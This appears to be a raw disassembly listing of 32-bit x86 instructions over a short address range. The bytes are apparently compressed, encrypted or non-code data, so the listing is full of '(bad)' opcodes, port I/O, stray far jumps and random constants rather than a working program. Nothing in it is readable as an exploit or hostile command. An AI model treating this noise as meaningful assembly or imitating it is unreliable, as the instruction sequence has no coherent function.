  41660f:	cmp    al,0x99
  416611:	dec    edi
  416612:	push   ds
  416613:	pusha  
  416614:	stc    
  416615:	xchg   edi,eax
  416616:	call   FWORD PTR [ecx-0x7e]
  416619:	add    al,0xfa
  41661b:	inc    ecx
  41661c:	scas   eax,DWORD PTR es:[edi]
  41661d:	lea    ebx,[ecx+ecx*8+0x2f]
  416621:	jecxz  0x41664e
  416623:	mov    bl,0x3d
  416625:	cmp    al,0x98
  416627:	dec    esp
  416628:	xchg   edx,eax
  416629:	cmp    bl,BYTE PTR [esi-0x7023f1f8]
  41662f:	dec    esi
  416630:	lods   eax,DWORD PTR ds:[esi]
  416631:	(bad)  
  416632:	sub    BYTE PTR [esi+0x65323792],ah
  416638:	inc    edx
  416639:	leave  
  41663a:	jne    0x416695
  41663c:	sub    DWORD PTR [edx],ebp
  41663e:	js     0x416695
  416640:	(bad)  
  416641:	push   cs
  416642:	dec    eax
  416643:	retf   0x554a
  416646:	xor    DWORD PTR [ecx-0x9],esi
  416649:	push   esi
  41664a:	test   DWORD PTR [eax+eax*2+0x1b],esp
  41664e:	outs   dx,DWORD PTR ds:[esi]
  41664f:	(bad)  
  416650:	mov    eax,ds:0x4f412bfc
  416655:	adc    DWORD PTR [ebx],eax
  416657:	inc    ebx
  416658:	adc    dh,BYTE PTR [eax]
  41665a:	out    dx,eax
  41665b:	imul   ebp,DWORD PTR [ebp+0x0],0xffffff82
  41665f:	popa   
  416660:	mov    bh,0x70
  416662:	test   eax,0xdb418c57
  416667:	inc    esp
  416668:	xchg   esp,eax
  416669:	pushf  
  41666a:	mov    edi,0x17140eaa
  41666f:	icebp  
  416670:	sar    BYTE PTR [esi-0x6c614169],cl
  416676:	in     al,dx
  416677:	shl    DWORD PTR [edi],1
  416679:	add    DWORD PTR [ebp-0x4f65969d],edx
  41667f:	jle    0x4166af
  416681:	ror    BYTE PTR [ebp-0x7a20b136],1
  416687:	fisub  DWORD PTR [edi+ecx*4+0xf]
  41668b:	les    ebp,FWORD PTR [edx-0x26]
  41668e:	pop    ebx
  41668f:	test   BYTE PTR [edx-0x56],ch
  416692:	rol    DWORD PTR [edi+0x50],0x5e
  416696:	cmp    BYTE PTR [ecx],bl
  416698:	sub    bl,bl
  41669a:	js     0x4166f8
  41669c:	cli    
  41669d:	push   ebx
  41669e:	or     dl,BYTE PTR [edi]
  4166a0:	pop    esi
  4166a1:	mov    ebx,0x832dd232
  4166a6:	jmp    0x41667a
  4166a8:	xchg   ebp,edx
  4166aa:	mov    ecx,0x3a880a00
  4166af:	loope  0x416681
  4166b1:	pop    ss
  4166b2:	mov    bl,0x4c
  4166b4:	out    0xb,al
  4166b6:	iret   
  4166b7:	mov    cl,BYTE PTR [ebx]
  4166b9:	mov    ch,0xa8
  4166bb:	inc    edx
  4166bc:	sub    dh,dh
  4166be:	push   eax
  4166bf:	xor    eax,0x85cd90c8
  4166c4:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166c6:	xor    DWORD PTR cs:[edi-0x68],esp
  4166ca:	nop
  4166cb:	and    DWORD PTR [eax+ebp*2],esi
  4166ce:	cli    
  4166cf:	dec    esi
  4166d0:	inc    ebx
  4166d1:	icebp  
  4166d2:	test   BYTE PTR [eax-0x3f],dl
  4166d5:	std    
  4166d6:	stos   BYTE PTR es:[edi],al
  4166d7:	nop
  4166d8:	hlt    
  4166d9:	mov    ebx,0xc6b681e1
  4166de:	add    al,0xd6
  4166e0:	push   ss
  4166e1:	pop    ebp
  4166e2:	mov    al,ds:0xfee2b667
  4166e7:	mov    edi,0x1f8af250
  4166ec:	fisubr DWORD PTR [edi-0x386c25e6]
  4166f2:	sub    DWORD PTR [ebx-0x72ed5a3c],edx
  4166f8:	push   edi
  4166f9:	cld    
  4166fa:	dec    esi
  4166fb:	sbb    DWORD PTR [eax+0x40],esp
  4166fe:	push   ebp
  4166ff:	rcr    dh,0x18
  416702:	clc    
  416703:	aaa    
  416704:	(bad)
  416708:	pop    edx
  416709:	jae    0x41672a
  41670b:	pop    edi
  41670c:	jno    0x416756
  41670e:	test   eax,0x95e4947a
  416713:	ss addr16 fcomip st,st(3)
  416717:	mov    edx,DWORD PTR [edx+0x516069c4]
  41671d:	inc    edx
  41671e:	in     al,dx
  41671f:	aaa    
  416720:	and    al,0x1f
  416722:	push   edx
  416723:	aas    
  416724:	jns    0x416778
  416726:	lea    edi,[edx]
  416728:	dec    esi
  416729:	out    dx,eax
  41672a:	cmp    eax,0x34138a8
  41672f:	loopne 0x4166ff
  416731:	pop    ebx
  416732:	mov    ch,BYTE PTR [eax-0x6b]
  416735:	out    dx,eax
  416736:	cli    
  416737:	push   ss
  416738:	push   esp
  416739:	mov    ds:0x9fe127a3,eax
  41673e:	rol    BYTE PTR [ecx+0x64a48973],0x84
  416745:	push   es
  416746:	jmp    0x41670f
  416748:	or     al,0x54
  41674a:	lods   eax,DWORD PTR ds:[esi]
  41674b:	push   ebx
  41674c:	jp     0x4166ee
  41674e:	mov    bl,0x50
  416750:	sub    eax,0xf74e7cdc
  416755:	mov    esp,0xcd9b223a
  41675a:	jg     0x41674f
  41675c:	jge    0x416794
  41675e:	cmp    DWORD PTR [eax-0x4a],esp
  416761:	sbb    eax,0x8f8b0943
  416766:	or     ebx,edx
  416768:	inc    edi
  416769:	nop
  41676a:	add    BYTE PTR [ebx-0x4e6bd934],al
  416770:	retf   0xf076
  416773:	lahf   
  416774:	gs popa 
  416776:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416777:	jp     0x4167a0
  416779:	cmp    dl,BYTE PTR [edi]
  41677b:	lock mov ds:0x3e47a64,al
  416781:	or     DWORD PTR [ebx+0x6c50369b],esi
  416787:	add    eax,0x239c450e
  41678c:	pop    edi
  41678d:	out    0x44,al
  41678f:	lds    ecx,FWORD PTR [ebx]
  416791:	xchg   ebx,eax
  416792:	in     eax,0x8d
  416794:	cdq    
  416795:	je     0x4167ec
  416797:	fnsave [edi-0x7e]
  41679a:	fs mov al,cl
  41679d:	leave  
  41679e:	in     eax,0xc
  4167a0:	sub    DWORD PTR [edx-0x3e],edx
  4167a3:	es dec edi
  4167a5:	inc    dh
  4167a7:	sbb    ebx,0x3909c9ad
  4167ad:	shl    DWORD PTR [ebp+0x42650623],1
  4167b3:	outs   dx,DWORD PTR ds:[esi]
  4167b4:	add    BYTE PTR [edx-0x61],ch
  4167b7:	shl    BYTE PTR [edx+0x1c],1
  4167ba:	cli    
  4167bb:	pop    esp
  4167bc:	xchg   ebp,eax
  4167bd:	and    BYTE PTR [edx+edi*4],ah
  4167c0:	jp     0x4167a5
  4167c2:	fwait
  4167c3:	stos   BYTE PTR es:[edi],al
  4167c4:	xchg   esi,eax
  4167c5:	std    
  4167c6:	jmp    0x4167d8
  4167c8:	pop    ds
  4167c9:	leave  
  4167ca:	mov    ds:0x90b40100,eax
  4167cf:	sub    cl,BYTE PTR [esi+0x64]
  4167d2:	(bad)  
  4167d3:	in     al,0xb6
  4167d5:	pop    edx
  4167d6:	pusha  
  4167d7:	or     al,0x1
  4167d9:	sbb    al,0x8e
  4167db:	jae    0x41679d
  4167dd:	out    dx,al
  4167de:	dec    eax
  4167df:	push   edi
  4167e0:	ret    
  4167e1:	mov    eax,0x48437089
  4167e6:	shl    BYTE PTR [esi],0xc8
  4167e9:	mov    al,ds:0xda7050b9
  4167ee:	push   eax
  4167ef:	dec    edi
  4167f0:	mov    eax,0xa72f2ba4
  4167f5:	add    BYTE PTR [ebx],dl
  4167f7:	cmp    DWORD PTR [edi-0x406f28f8],edi
  4167fd:	mov    ch,0xb5
  4167ff:	fsub   DWORD PTR [edx+ebx*2]
  416802:	cdq    
  416803:	or     eax,0xb4e3acab
  416808:	cdq    
  416809:	iret   
  41680a:	adc    BYTE PTR [edx+0x77],bh
  41680d:	mov    ah,0x5
  41680f:	add    eax,0xbf828b29
  416814:	loope  0x416818
  416816:	and    edi,0xffffffbe
  416819:	sbb    DWORD PTR [esi-0x1e07ffe1],esp
  41681f:	mov    bh,0x0
  416821:	je     0x4167e2
  416823:	int    0x7b
  416825:	cwde   
  416826:	ins    BYTE PTR es:[edi],dx
  416827:	arpl   WORD PTR [ebx],bp
  416829:	pop    ds
  41682a:	not    DWORD PTR [esi+0x59]
  41682d:	es aas 
  41682f:	retf   
  416830:	jno    0x416802
  416832:	hlt    
  416833:	cwde   
  416834:	sbb    esp,DWORD PTR [esi+0x776f4b24]
  41683a:	test   BYTE PTR [ecx+edi*1],dl
  41683d:	pop    es
  41683e:	ins    BYTE PTR es:[edi],dx
  41683f:	pop    edx
  416840:	cmp    BYTE PTR [eax+eax*1-0x7d0a571b],ch
  416847:	add    eax,0xe54ccd19
  41684c:	and    edx,DWORD PTR [eax-0x40]
  41684f:	je     0x416880
  416851:	outs   dx,BYTE PTR ds:[esi]
  416852:	mov    bl,0x79
  416854:	andps  xmm7,XMMWORD PTR [edx]
  416857:	push   ss
  416858:	jmp    0x49209dda
  41685d:	dec    esi
  41685e:	push   edi
  41685f:	pop    eax
  416860:	adc    eax,0xa173c615
  416865:	(bad)  
  416866:	lock xchg ebx,eax
  416868:	mov    al,ds:0xe19a32be
  41686d:	inc    ebp
  41686e:	sub    eax,ebx
  416870:	jb     0x416874
  416872:	je     0x4168e3
  416874:	das    
  416875:	hlt    
  416876:	sar    DWORD PTR ds:0x6336c2e0,0x8d
  41687d:	jnp    0x416816
  41687f:	in     eax,dx
  416880:	xchg   esi,eax
  416881:	fucom  st(7)
  416883:	out    dx,eax
  416884:	pop    edx
  416885:	iret   
  416886:	clc    
  416887:	(bad)  
  416888:	aas    
  416889:	cwde   
  41688a:	pop    ds
  41688b:	frndint 
  41688d:	jne    0x4168f8
  41688f:	(bad)  
  416890:	int    0x34
  416892:	pusha  
  416893:	push   eax
  416894:	retf   
  416895:	mov    esp,0x7211b406
  41689a:	popa   
  41689b:	or     DWORD PTR [eax-0x2c06deb0],ebx
  4168a1:	aam    0x6b
  4168a3:	cmp    al,0x92
  4168a5:	xor    DWORD PTR [esi+0x75],0x6f
  4168a9:	and    al,0xda
  4168ab:	xchg   edi,eax
  4168ac:	test   ebp,0x82461b26
  4168b2:	ret    0xa5a3
  4168b5:	outs   dx,DWORD PTR ds:[esi]
  4168b6:	mov    edi,0x2d85a1ff
  4168bb:	push   edi
  4168bc:	push   ecx
  4168bd:	cmp    ecx,DWORD PTR ds:[ecx]
  4168c0:	les    ecx,FWORD PTR [ebp+0x5b31296b]
  4168c6:	(bad)  
  4168c7:	add    eax,0xc0fd919a
  4168cc:	mov    ebp,0xffae72a
  4168d1:	mov    eax,0xbf6a768c
  4168d6:	mov    ds:0xf0f2cd87,eax
  4168db:	mov    DWORD PTR ds:0xea6894c6,ebp
  4168e1:	or     al,0x77
  4168e3:	add    dl,ah
  4168e5:	div    BYTE PTR [edx]
  4168e7:	sbb    eax,0x6a92d9e
  4168ec:	or     dh,BYTE PTR [ebp-0x37]
  4168ef:	xlat   BYTE PTR ds:[ebx]
  4168f0:	mov    esp,0x2d3580ac
  4168f5:	iret   
  4168f6:	mov    bl,0x62
  4168f8:	push   DWORD PTR [edi+0x79]
  4168fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168fc:	mov    ecx,0x3383df56
  416901:	pop    eax
  416902:	sub    eax,0x535ce98e
  416907:	es sub eax,0xe13e43d7
  41690d:	lea    ebx,[esi+ebx*8-0x3]
  416911:	sbb    dh,dh
  416913:	add    al,0xde
  416915:	xchg   ebx,eax
  416916:	sub    DWORD PTR cs:[esi+0x6c],0xffffff81
  41691b:	inc    esp
  41691c:	adc    DWORD PTR [edx],edx
  41691e:	sbb    dl,ah
  416920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416921:	imul   bl
  416923:	(bad)  
  416924:	sub    eax,ebp
  416926:	ins    DWORD PTR es:[edi],dx
  416927:	sub    DWORD PTR [ecx+0x208666a8],ebp
  41692d:	icebp  
  41692e:	pop    eax
  41692f:	jno    0x416975
  416931:	inc    esi
  416932:	test   BYTE PTR [ecx],0xda
  416935:	xor    ebp,eax
  416937:	adc    al,0x2c
  416939:	mov    esi,0xf172824f
  41693e:	xchg   BYTE PTR [eax+0x3c],bh
  416941:	push   ecx
  416942:	(bad)  
  416943:	and    al,0xc3
  416945:	outs   dx,BYTE PTR ds:[esi]
  416946:	mov    WORD PTR [eax+0xa],cs
  416949:	mov    cl,BYTE PTR [esi+0x98e0bda]
  41694f:	mov    bl,0xf2
  416951:	ret    0x77ee
  416954:	shl    cl,cl
  416956:	gs popf 
  416958:	xor    al,BYTE PTR [ecx]
  41695a:	int    0xa1
  41695c:	push   es
  41695d:	hlt    
  41695e:	cld    
  41695f:	add    DWORD PTR [eax+0x63],edx
  416962:	dec    eax
  416963:	inc    ebp
  416964:	leave  
  416965:	sub    al,0xb8
  416967:	or     al,0xc2
  416969:	sti    
  41696a:	sbb    edi,eax
  41696c:	dec    ebx
  41696d:	xor    DWORD PTR [eax+0x1a],ecx
  416970:	js     0x416984
  416972:	or     al,0x9e
  416974:	mov    ch,0x6
  416976:	shr    DWORD PTR [ebx-0x70],0xec
  41697a:	lods   al,BYTE PTR ds:[esi]
  41697b:	jmp    0x41696e
  41697d:	adc    al,0x38
  41697f:	ins    DWORD PTR es:[edi],dx
  416980:	ins    DWORD PTR es:[edi],dx
  416981:	ins    BYTE PTR es:[edi],dx
  416982:	mov    ah,0x60
  416984:	ds call 0xb976e6eb
  41698a:	push   edi
  41698b:	fst    QWORD PTR [esi]
  41698d:	jno    0x416a00
  41698f:	inc    eax
  416990:	gs (bad) 
  416992:	nop
  416993:	cmp    cl,ah
  416995:	sub    DWORD PTR ds:0x54f4b116,edi
  41699b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41699c:	adc    al,BYTE PTR [ebx]
  41699e:	fnstenv [ecx+0x5ae8ef1]
  4169a4:	mov    eax,ds:0xef56fc9
  4169a9:	push   DWORD PTR [esi+0x5d3ee358]
  4169af:	cmp    BYTE PTR [ecx+0x2a916e32],dl
  4169b5:	or     eax,0xd8f388b9
  4169ba:	(bad)  
  4169bb:	dec    ebx
  4169bc:	pop    esp
  4169bd:	and    esp,DWORD PTR [ecx]
  4169bf:	jae    0x416a28
  4169c1:	jb     0x416a27
  4169c3:	cmp    ebp,DWORD PTR [ebp+0x199c00d2]
  4169c9:	imul   ecx,eax,0xffffffe0
  4169cc:	dec    esi
  4169cd:	ror    DWORD PTR [ebx+ecx*4+0x2aadc559],1
  4169d4:	inc    edi
  4169d5:	mov    esi,0xa6d304d5
  4169da:	outs   dx,BYTE PTR ds:[esi]
  4169db:	lock xor DWORD PTR [esi+0x526a974],edi
  4169e2:	stc    
  4169e3:	into   
  4169e4:	stos   BYTE PTR es:[edi],al
  4169e5:	xor    DWORD PTR ds:[edi-0x27],esp
  4169e9:	jmp    0x519e:0xdf833fa1
  4169f0:	sub    BYTE PTR [eax-0x7134c35a],0x57
  4169f7:	push   0x73a140ff
  4169fc:	enter  0x83f3,0x35
  416a00:	xchg   ebp,eax
  416a01:	std    
  416a02:	mov    eax,0x1264efd7
  416a07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a08:	xchg   esp,eax
  416a09:	inc    ebx
  416a0a:	out    dx,al
  416a0b:	adc    ebx,DWORD PTR ds:0xb0d3dbb4
  416a11:	or     DWORD PTR [edx-0x2b],esp
  416a14:	sbb    eax,0x18169959
  416a19:	push   es
  416a1a:	mov    al,ds:0xae8adbb3
  416a1f:	jmp    0x4db9ad31
  416a24:	jecxz  0x416a3e
  416a26:	pop    eax
  416a27:	push   edi
  416a28:	dec    eax
  416a29:	inc    edx
  416a2a:	(bad)  
  416a2b:	(bad)  
  416a2d:	dec    esi
  416a2e:	push   es
  416a2f:	sub    eax,0xefb423f1
  416a34:	push   ss
  416a35:	sti    
  416a36:	sbb    eax,0xcea7d797
  416a3b:	push   ecx
  416a3c:	xor    al,0xa8
  416a3e:	rol    DWORD PTR [edi],0x5c
  416a41:	push   esi
  416a42:	out    dx,eax
  416a43:	cs (bad) 
  416a45:	pop    ebp
  416a46:	cmp    cl,ah
  416a48:	mov    ch,0x78
  416a4a:	jge    0x416a40
  416a4c:	pop    ds
  416a4d:	repz adc al,0x1e
  416a50:	jle    0x416ad0
  416a52:	cld    
  416a53:	hlt    
  416a54:	add    BYTE PTR [esi-0x7e353f05],cl
  416a5a:	push   ecx
  416a5b:	fcom   DWORD PTR [eax]
  416a5d:	jno    0x416a99
  416a5f:	sub    al,0x57
  416a61:	mov    al,0x41
  416a63:	sub    dh,al
  416a65:	xchg   ecx,esp
  416a67:	cmp    eax,0xccd84254
  416a6c:	imul   eax,edi,0x32
  416a6f:	mov    ebx,ecx
  416a71:	aad    0x8a
  416a73:	call   FWORD PTR [ebx-0x6a]
  416a76:	fs dec ebx
  416a78:	jp     0x416a59
  416a7a:	mov    WORD PTR [edi],?
  416a7c:	stc    
  416a7d:	(bad)  
  416a7e:	retf   0xaed2
  416a81:	push   esi
  416a82:	sbb    eax,0x631f60ee
  416a87:	sbb    al,BYTE PTR [esp+ebp*2]
  416a8a:	fsub   DWORD PTR [esi]
  416a8c:	mov    esi,0x9d5973a9
  416a91:	pop    ss
  416a92:	bnd jnp 0x416b10
  416a95:	sbb    al,0x4a
  416a97:	aaa    
  416a98:	mov    al,0xfb
  416a9a:	jno    0x416a9e
  416a9c:	adc    bh,BYTE PTR ds:0x2d6944e4
  416aa2:	xchg   edx,eax
  416aa3:	mov    edx,0x2155b058
  416aa8:	add    al,0x86
  416aaa:	(bad)  
  416aab:	retf   
  416aac:	(bad)  
  416aad:	xor    eax,0x4a50c002
  416ab2:	mov    ebp,0xbfdcb989
  416ab7:	shld   DWORD PTR [edx-0x3a],edi,0xe0
  416abc:	jmp    0x416a69
  416abe:	mov    al,ds:0xae3a54e8
  416ac3:	fidivr DWORD PTR [esi]
  416ac5:	ror    ebx,0xa8
  416ac8:	mov    ebx,0xa6ff0012
  416acd:	sub    esi,DWORD PTR [edi]
  416acf:	int3   
  416ad0:	aas    
  416ad1:	shl    DWORD PTR [ecx-0x2e],cl
  416ad4:	loopne 0x416a7c
  416ad6:	sub    bh,bh
  416ad8:	cmp    bh,BYTE PTR [edx]
  416ada:	loope  0x416b2d
  416adc:	inc    esp
  416add:	xlat   BYTE PTR ds:[ebx]
  416ade:	sbb    eax,0xd1fafb3a
  416ae3:	push   0xc39db9f6
  416ae8:	add    al,0x86
  416aea:	jae    0x416b4f
  416aec:	mov    al,ds:0xd1aa6f27
  416af1:	fwait
  416af2:	rcr    DWORD PTR [esi],cl
  416af4:	push   ss
  416af5:	shl    BYTE PTR [ebx-0x539cf90d],1
  416afb:	dec    esi
  416afc:	out    dx,eax
  416afd:	outs   dx,DWORD PTR ds:[esi]
  416afe:	int    0x3e
  416b00:	fnstcw WORD PTR [edx+0x6b2bfba8]
  416b06:	imul   edi,ebp,0xffffffc4
  416b09:	test   DWORD PTR [ebp-0x24416bad],edx
  416b0f:	and    eax,0x9ed58c18
  416b14:	hlt    
  416b15:	or     ah,ah
  416b17:	sbb    edi,DWORD PTR [ebx-0x3e]
  416b1a:	sbb    al,0x7
  416b1c:	retf   
  416b1d:	addr16 dec edi
  416b1f:	lea    esi,[ebx+eax*4-0x7c]
  416b23:	xchg   ebx,eax
  416b24:	mov    esp,0x9e0272f8
  416b29:	loop   0x416b46
  416b2b:	std    
  416b2c:	popa   
  416b2d:	mov    esi,0x89c849d5
  416b32:	and    dl,al
  416b34:	dec    ebp
  416b35:	xchg   ebx,eax
  416b36:	pop    edx
  416b37:	pushf  
  416b38:	xlat   BYTE PTR ds:[ebx]
  416b39:	mov    edi,0x4d211315
  416b3e:	push   esi
  416b3f:	icebp  
  416b40:	cmp    ch,BYTE PTR [edi-0x79]
  416b43:	int    0x52
  416b45:	dec    edx
  416b46:	dec    ebp
  416b47:	in     eax,0xb1
  416b49:	stos   DWORD PTR es:[edi],eax
  416b4a:	test   eax,eax
  416b4c:	mov    edi,0x1adb47b8
  416b51:	out    0x87,al
  416b53:	bound  esp,QWORD PTR [esi+esi*4-0x511be1b0]
  416b5a:	add    ebp,edi
  416b5c:	and    bl,BYTE PTR [edi+0x12]
  416b5f:	fbstp  TBYTE PTR [esi]
  416b61:	dec    edx
  416b62:	pop    ecx
  416b63:	pop    esi
  416b64:	test   esi,esi
  416b66:	std    
  416b67:	jno    0x416b71
  416b69:	push   0x2f
  416b6b:	in     al,dx
  416b6c:	pop    edx
  416b6d:	cs in  al,0x69
  416b70:	mov    ebp,0x756bdcf2
  416b75:	daa    
  416b76:	retf   
  416b77:	mov    edi,0x23552378
  416b7c:	ret    0x5815
  416b7f:	inc    ebx
  416b80:	pop    esp
  416b81:	cmp    cl,dl
  416b83:	in     al,dx
  416b84:	pop    ebp
  416b85:	dec    edi
  416b86:	test   BYTE PTR [eax],cl
  416b88:	dec    esp
  416b89:	adc    ah,BYTE PTR [eax-0x24]
  416b8c:	out    dx,al
  416b8d:	ins    DWORD PTR es:[edi],dx
  416b8e:	into   
  416b8f:	inc    eax
  416b90:	pop    es
  416b91:	jle    0x416bbc
  416b93:	fcmovnbe st,st(5)
  416b95:	jmp    0x416b9d
  416b97:	arpl   WORD PTR [esi-0x13d2d826],dx
  416b9d:	sbb    cl,BYTE PTR es:[ecx+0x7b]
  416ba1:	das    
  416ba2:	jae    0x416b93
  416ba4:	fisttp WORD PTR [eax+0x6d]
  416ba7:	jge    0x416b51
  416ba9:	out    dx,al
  416baa:	ja     0x416beb
  416bac:	sti    
  416bad:	lods   al,BYTE PTR ds:[esi]
  416bae:	loop   0x416b70
  416bb0:	and    bl,BYTE PTR [edx]
  416bb2:	sti    
  416bb3:	add    eax,0x27250330
  416bb8:	or     al,0x76
  416bba:	cmc    
  416bbb:	mov    ds:0xc71ecb74,eax
  416bc0:	mov    bl,0xe9
  416bc2:	daa    
  416bc3:	sub    eax,0x5c970859
  416bc8:	inc    eax
  416bc9:	cwde   
  416bca:	xchg   edi,eax
  416bcb:	xchg   esi,eax
  416bcc:	or     BYTE PTR [ecx],bl
  416bce:	fiadd  DWORD PTR [esi]
  416bd0:	add    edi,DWORD PTR [edi]
  416bd2:	es std 
  416bd4:	jle    0x416bbc
  416bd6:	std    
  416bd7:	jb     0x416c18
  416bd9:	mov    ch,0x88
  416bdb:	mov    cl,0xd4
  416bdd:	add    eax,0x5b391ee8
  416be2:	daa    
  416be3:	and    al,ch
  416be5:	mov    ah,bl
  416be7:	xchg   ebp,eax
  416be8:	(bad)  
  416be9:	enter  0xb6a3,0x2d
  416bed:	push   edi
  416bee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bef:	retf   
  416bf0:	sub    eax,0x3384bd93
  416bf5:	adc    al,0xca
  416bf7:	imul   edi,DWORD PTR [eax+0x339a15d3],0x3a2ed1c0
  416c01:	jg     0x416ba7
  416c03:	adc    DWORD PTR [edx],ebp
  416c05:	mov    BYTE PTR [esi+0x2dddcb13],0x97
  416c0c:	fistp  WORD PTR [edx-0x6d]
  416c0f:	iret   
  416c10:	aaa    
  416c11:	es hlt 
  416c13:	jl     0x416b9d
  416c15:	or     eax,0x82513c7d
  416c1a:	sub    eax,0xc1fdc480
  416c1f:	adc    ebp,DWORD PTR [edi+0x7c2afa5a]
  416c25:	std    
  416c26:	push   ds
  416c27:	xor    BYTE PTR ds:0xdcfd0123,ah
  416c2d:	aam    0x41
  416c2f:	mov    fs,WORD PTR [eax-0x7501b284]
  416c35:	adc    ebx,ebx
  416c37:	pop    ecx
  416c38:	out    dx,al
  416c39:	dec    edi
  416c3a:	sbb    BYTE PTR [ebx],0x88
  416c3d:	sub    eax,0x7aa3b1f5
  416c42:	(bad)  
  416c43:	or     al,0x5d
  416c45:	mov    dh,0x11
  416c47:	add    al,0xad
  416c49:	stc    
  416c4a:	pushf  
  416c4b:	dec    ebp
  416c4c:	and    DWORD PTR [ecx+0x76],esp
  416c4f:	xchg   ebp,eax
  416c50:	pop    ebp
  416c51:	out    0x63,eax
  416c53:	mov    eax,ds:0x51841eac
  416c58:	ins    BYTE PTR es:[edi],dx
  416c59:	sbb    esi,DWORD PTR [ebx]
  416c5b:	add    al,0x2b
  416c5d:	cdq    
  416c5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c5f:	jp     0x416c83
  416c61:	mov    ch,0x69
  416c63:	jge    0x416cb7
  416c65:	(bad)  
  416c66:	pop    eax
  416c67:	idiv   DWORD PTR [ecx+0x19]
  416c6a:	movaps xmm7,xmm5
  416c6d:	test   eax,0x61d5ed6c
  416c72:	sub    dl,0xc1
  416c75:	add    al,0xee
  416c77:	mov    ecx,0xa90d7138
  416c7c:	(bad)  
  416c7d:	leave  
  416c7e:	scas   al,BYTE PTR es:[edi]
  416c7f:	mov    ah,0x3d
  416c81:	dec    edi
  416c82:	bound  edx,QWORD PTR [edi-0x3a]
  416c85:	sbb    eax,0xdafedae6
  416c8a:	add    al,0xf5
  416c8c:	sti    
  416c8d:	sbb    bh,BYTE PTR [eax+ebx*1+0x1c]
  416c91:	fsub   QWORD PTR [eax+0x41]
  416c94:	jp     0x416c73
  416c96:	(bad)  
  416c97:	(bad)  
  416c98:	fucomp st(6)
  416c9a:	and    BYTE PTR [edi+0x27],dh
  416c9d:	nop
  416c9e:	pop    eax
  416c9f:	pop    es
  416ca0:	sub    DWORD PTR [ebx+esi*4],0xf8501f3f
  416ca7:	rcl    DWORD PTR [eax-0x22],0x82
  416cab:	mov    ?,WORD PTR [eax]
  416cad:	add    eax,DWORD PTR [ebx]
  416caf:	data16 add bl,bh
  416cb2:	push   esp
  416cb3:	and    eax,DWORD PTR ds:0x34f46d4b
  416cb9:	cld    
  416cba:	popf   
  416cbb:	xor    bh,BYTE PTR [ebp+0x18]
  416cbe:	or     BYTE PTR [ebx],cl
  416cc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cc1:	inc    ecx
  416cc2:	cmp    eax,0xba0ab5cb
  416cc7:	(bad)  
  416cc8:	pushf  
  416cc9:	dec    ebx
  416cca:	sub    al,0xbd
  416ccc:	lock cld 
  416cce:	fsub   st,st(6)
  416cd0:	inc    edi
  416cd1:	das    
  416cd2:	sti    
  416cd3:	repz mov esp,0x6dcea812
  416cd9:	les    ecx,FWORD PTR ds:0x5e28c609
  416cdf:	jmp    0x416c98
  416ce1:	or     al,BYTE PTR ds:[eax-0x562bc60b]
  416ce8:	ret    0x11a3
  416ceb:	add    eax,0xa00b581d
  416cf0:	jl     0x416ca4
  416cf2:	in     al,dx
  416cf3:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  416cf5:	lock cmp DWORD PTR [esi+eax*1+0x66],ebp
  416cfa:	jmp    0x546a:0xfe49615b
  416d01:	loopne 0x416ca0
  416d03:	dec    eax
  416d04:	push   es
  416d05:	clc    
  416d06:	shl    WORD PTR [ecx+ebp*1+0x736dad19],0x31
  416d0f:	xchg   ecx,eax
  416d10:	pop    ss
  416d11:	test   dh,bl
  416d13:	shl    BYTE PTR [ebp+0xd],0xa9
  416d17:	inc    edi
  416d18:	outs   dx,DWORD PTR ds:[esi]
  416d19:	xchg   ecx,eax
  416d1a:	mov    ds:0x9d72b62e,eax
  416d1f:	nop
  416d20:	cmp    esp,DWORD PTR [edi-0x7b]
  416d23:	dec    ecx
  416d24:	lds    ebp,FWORD PTR [esi+0x607cf64c]
  416d2a:	aad    0xbe
  416d2c:	lods   al,BYTE PTR ds:[esi]
  416d2d:	mov    esp,0xbcfae313
  416d32:	shl    BYTE PTR [edi-0x6a03790a],cl
  416d38:	pop    eax
  416d39:	mov    bh,0x9
  416d3b:	pop    esi
  416d3c:	xchg   al,cl
  416d3e:	js     0x416d1d
  416d40:	pop    eax
  416d41:	dec    ebx
  416d42:	fs mov bh,0x9b
  416d45:	js     0x416cd3
  416d47:	cmp    DWORD PTR [edx],0xc4a0b013
  416d4d:	sbb    dh,bl
  416d4f:	inc    edx
  416d50:	cld    
  416d51:	mov    ds:0x55f6e5c0,al
  416d56:	jns    0x416d75
  416d58:	or     DWORD PTR [ecx],ebp
  416d5a:	and    al,0x87
  416d5c:	test   DWORD PTR [ebx-0x25e3b7a1],0xb94b423a
  416d66:	adc    eax,0xa99a2a6c
  416d6b:	mov    ds:0xbe2e9c4c,al
  416d70:	fld    DWORD PTR [esi-0x6b55ff2e]
  416d76:	les    edi,FWORD PTR [esi+0x49]
  416d79:	sti    
  416d7a:	add    esi,DWORD PTR [eax+0x37fbde00]
  416d80:	xor    BYTE PTR [edx+esi*1],bl
  416d83:	shl    DWORD PTR [esi+ecx*8],cl
  416d86:	inc    eax
  416d88:	or     dh,dh
  416d8a:	lods   al,BYTE PTR ds:[esi]
  416d8b:	xlat   BYTE PTR ds:[ebx]
  416d8c:	xchg   ebx,eax
  416d8d:	jmp    0xf7f8:0xacc899e2
  416d94:	test   al,0xda
  416d96:	aas    
  416d97:	das    
  416d98:	inc    esi
  416d99:	(bad)  
  416d9a:	fcmovu st,st(3)
  416d9c:	div    DWORD PTR [edi+esi*4+0x4007e609]
  416da3:	(bad)
  416da6:	aam    0xf2
  416da8:	add    esp,edx
  416daa:	pop    ss
  416dab:	push   ds
  416dac:	pop    ebp
  416dad:	and    BYTE PTR [ecx+0x7c],bh
  416db0:	push   0xd46eefda
  416db5:	add    al,0x2
  416db7:	call   0xdc3c:0xe754770e
  416dbe:	jnp    0x416d87
  416dc0:	mov    edi,0x8f153fa5
  416dc5:	std    
  416dc6:	mov    ecx,0x82293f8
  416dcb:	add    al,0xe6
  416dcd:	push   ebp
  416dce:	xor    DWORD PTR [ebx-0x4c107c1a],esi
